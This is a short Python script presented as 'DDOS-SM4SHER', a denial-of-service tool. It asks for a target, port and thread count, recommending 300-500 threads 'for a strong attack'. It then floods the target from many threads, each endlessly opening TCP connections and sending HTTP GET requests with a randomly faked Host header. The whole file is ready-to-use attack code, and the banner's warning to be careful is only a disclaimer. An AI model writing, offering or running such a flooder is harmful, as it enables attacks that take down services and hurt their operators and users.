import socket
import threading
from faker import Faker

print ("~DDOS-SM4SHER~    *be careful how you use this tool*")
target = input("Enter target: ")
ex = Faker()
fake_ip = ex.ipv4()
port = int(input("Port:"))
th = int(input("Threads: (Around 300-500 for a strong attack) "))
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
 
        global attack_num
        attack_num += 1
        print("Requests sent: " , attack_num , "To: " , target , "Throught Port: " , port)
        
        s.close()

for i in range(th):
    thread = threading.Thread(target=attack)
    thread.start()